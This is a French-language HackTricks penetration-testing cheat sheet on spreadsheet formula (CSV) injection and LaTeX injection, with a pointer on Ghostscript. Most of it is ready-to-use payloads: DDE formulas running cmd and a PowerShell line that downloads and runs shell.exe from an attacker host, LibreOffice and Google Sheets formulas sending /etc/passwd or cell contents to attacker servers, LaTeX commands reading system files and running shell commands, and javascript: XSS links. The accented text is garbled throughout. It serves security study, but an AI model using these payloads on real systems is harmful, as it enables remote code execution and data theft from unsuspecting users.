# Injection de formules/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Injection de formules

### Info

Si votre **entr√©e** est **r√©fl√©chie** √† l'int√©rieur de **fichiers CSV** (ou tout autre fichier qui sera probablement ouvert par **Excel**), vous pourriez √™tre en mesure d'ins√©rer des **formules Excel** qui seront **ex√©cut√©es** lorsque l'utilisateur **ouvre le fichier** ou lorsque l'utilisateur **clique sur un lien** √† l'int√©rieur de la feuille Excel.

{% hint style="danger" %}
De nos jours, **Excel alertera** (√† plusieurs reprises) l'utilisateur lorsque quelque chose est charg√© depuis l'ext√©rieur d'Excel afin de l'emp√™cher d'effectuer des actions malveillantes. Par cons√©quent, un effort particulier en ing√©nierie sociale doit √™tre appliqu√© au payload final.
{% endhint %}

### [Liste de mots](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlien

**L'exemple suivant est tr√®s utile pour exfiltrer du contenu de la feuille Excel finale et effectuer des requ√™tes vers des emplacements arbitraires. Mais cela n√©cessite que l'utilisateur clique sur le lien (et accepte les avertissements).**

L'exemple suivant a √©t√© pris sur [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Imaginez une violation de s√©curit√© dans un syst√®me de gestion des dossiers √©tudiants exploit√©e √† travers une attaque par injection CSV. L'intention principale de l'attaquant est de compromettre le syst√®me utilis√© par les enseignants pour g√©rer les d√©tails des √©tudiants. La m√©thode implique que l'attaquant injecte une charge malveillante dans l'application, en entrant sp√©cifiquement des formules nocives dans les champs destin√©s aux d√©tails des √©tudiants. L'attaque se d√©roule comme suit :

1. **Injection de la Charge Malveillante :**
* L'attaquant soumet un formulaire de d√©tails d'√©tudiant mais inclut une formule couramment utilis√©e dans les feuilles de calcul (par exemple, `=HYPERLINK("<malicious_link>","Cliquez ici")`).
* Cette formule est con√ßue pour cr√©er un hyperlien, mais elle pointe vers un serveur malveillant contr√¥l√© par l'attaquant.
2. **Exportation des Donn√©es Compromises :**
* Les enseignants, inconscients de la compromission, utilisent la fonctionnalit√© de l'application pour exporter les donn√©es dans un fichier CSV.
* Le fichier CSV, lorsqu'il est ouvert, contient toujours la charge malveillante. Cette charge appara√Æt comme un hyperlien cliquable dans la feuille de calcul.
3. **D√©clenchement de l'Attaque :**
* Un enseignant clique sur le lien hypertexte, croyant qu'il fait partie l√©gitime des d√©tails de l'√©tudiant.
* En cliquant, des donn√©es sensibles (pouvant inclure des d√©tails de la feuille de calcul ou de l'ordinateur de l'enseignant) sont transmises au serveur de l'attaquant.
4. **Enregistrement des Donn√©es :**
* Le serveur de l'attaquant re√ßoit et enregistre les donn√©es sensibles envoy√©es depuis l'ordinateur de l'enseignant.
* L'attaquant peut ensuite utiliser ces donn√©es √† diverses fins malveillantes, compromettant davantage la confidentialit√© et la s√©curit√© des √©tudiants et de l'institution.

### RCE

**Consultez le** [**message original**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **pour plus de d√©tails.**

Dans des configurations sp√©cifiques ou des versions plus anciennes d'Excel, une fonctionnalit√© appel√©e √âchange de Donn√©es Dynamique (DDE) peut √™tre exploit√©e pour ex√©cuter des commandes arbitraires. Pour exploiter cela, les param√®tres suivants doivent √™tre activ√©s :

* Acc√©dez √† Fichier ‚Üí Options ‚Üí Centre de confiance ‚Üí Param√®tres du Centre de confiance ‚Üí Contenu externe, et activez **Lancement du Serveur d'√âchange de Donn√©es Dynamique**.

Lorsqu'une feuille de calcul avec la charge malveillante est ouverte (et si l'utilisateur accepte les avertissements), la charge est ex√©cut√©e. Par exemple, pour lancer l'application calculatrice, la charge serait :
```markdown
`=cmd|' /C calc'!xxx`
```
Des commandes suppl√©mentaires peuvent √©galement √™tre ex√©cut√©es, telles que le t√©l√©chargement et l'ex√©cution d'un fichier en utilisant PowerShell :
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Inclusion de fichier local (LFI) dans LibreOffice Calc

LibreOffice Calc peut √™tre utilis√© pour lire des fichiers locaux et exfiltrer des donn√©es. Voici quelques m√©thodes :

* Lire la premi√®re ligne du fichier local `/etc/passwd` : `='file:///etc/passwd'#$passwd.A1`
* Exfiltrer les donn√©es lues vers un serveur contr√¥l√© par un attaquant : `=WEBSERVICE(CONCATENATE("http://<adresse IP de l'attaquant>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrer plus d'une ligne : `=WEBSERVICE(CONCATENATE("http://<adresse IP de l'attaquant>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltration DNS (envoi des donn√©es lues sous forme de requ√™tes DNS √† un serveur DNS contr√¥l√© par un attaquant) : `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<domaine de l'attaquant>"))`

### Google Sheets pour l'exfiltration de donn√©es hors bande (OOB)

Google Sheets propose des fonctions qui peuvent √™tre exploit√©es pour l'exfiltration de donn√©es OOB :

* **CONCATENATE** : Concat√®ne des cha√Ænes de caract√®res - `=CONCATENATE(A2:E2)`
* **IMPORTXML** : Importe des donn√©es √† partir de types de donn√©es structur√©es - `=IMPORTXML(CONCAT("http://<adresse IP de l'attaquant:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED** : Importe des flux RSS ou ATOM - `=IMPORTFEED(CONCAT("http://<adresse IP de l'attaquant:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML** : Importe des donn√©es √† partir de tableaux HTML ou de listes - `=IMPORTHTML (CONCAT("http://<adresse IP de l'attaquant:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE** : Importe une plage de cellules d'une autre feuille de calcul - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[ID_de_la_feuille]", "feuille1!A2:E2")`
* **IMAGE** : Ins√®re une image dans une cellule - `=IMAGE("https://<adresse IP de l'attaquant:Port>/images/srpr/logo3w.png")`

## Injection LaTeX

G√©n√©ralement, les serveurs que l'on trouve sur Internet qui **convertissent du code LaTeX en PDF** utilisent **`pdflatex`**.\
Ce programme utilise 3 attributs principaux pour autoriser ou interdire l'ex√©cution de commandes :

* **`--no-shell-escape`** : **D√©sactive** la construction `\write18{command}`, m√™me si elle est activ√©e dans le fichier texmf.cnf.
* **`--shell-restricted`** : Identique √† `--shell-escape`, mais **limit√©** √† un ensemble de \*\*commandes \*\*pr√©d√©finies (\*\*Sur Ubuntu 16.04, la liste se trouve dans `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`** : **Active** la construction `\write18{command}`. La commande peut √™tre n'importe quelle commande shell. Cette construction est normalement interdite pour des raisons de s√©curit√©.

Cependant, il existe d'autres moyens d'ex√©cuter des commandes, donc pour √©viter une ex√©cution de code √† distance, il est tr√®s important d'utiliser `--shell-restricted`.

### Lire le fichier <a href="#read-file" id="read-file"></a>

Vous devrez peut-√™tre ajuster l'injection avec des wrappers comme \[ ou $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Lire un fichier d'une seule ligne
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Lire un fichier √† plusieurs lignes
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### √âcrire le fichier <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ex√©cution de commandes <a href="#command-execution" id="command-execution"></a>

L'entr√©e de la commande sera redirig√©e vers stdin, utilisez un fichier temporaire pour l'obtenir.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si vous rencontrez une erreur LaTex, envisagez d'utiliser base64 pour obtenir le r√©sultat sans caract√®res ind√©sirables
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Injection Ghostscript

**V√©rifier** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## R√©f√©rences

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
